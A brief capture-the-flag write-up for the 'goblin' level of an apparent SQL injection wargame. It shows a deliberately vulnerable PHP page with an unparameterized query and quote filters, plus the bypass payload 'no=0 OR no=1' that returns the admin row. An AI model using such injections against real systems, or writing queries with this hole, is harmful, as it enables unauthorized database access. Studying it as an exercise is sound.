# goblin

Here is the challenge:

```php
<?php 
  include "./config.php"; 
  login_chk(); 
  $db = dbconnect(); 
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[no])) exit("No Hack ~_~"); 
  if(preg_match('/\'|\"|\`/i', $_GET[no])) exit("No Quotes ~_~"); 
  $query = "select id from prob_goblin where id='guest' and no={$_GET[no]}"; 
  echo "<hr>query : <strong>{$query}</strong><hr><br>"; 
  $result = @mysqli_fetch_array(mysqli_query($db,$query)); 
  if($result['id']) echo "<h2>Hello {$result[id]}</h2>"; 
  if($result['id'] == 'admin') solve("goblin");
  highlight_file(__FILE__); 
?>
```

One of the rule is to not use quotes. At first, I thought I have to do UNION or something like that, but after a few tries, I gave up because I can't find a way to do UNION attack without quotes.

So I just tried some random input, and when I tried `no=1`, I got

```
Hello guest
```

So I know that `no` is a number, and I need to somehow get `admin`'s `no`. I then try

```
no=0 OR no=1
```

And get

```
Hello admin
GOBLIN Clear!
```
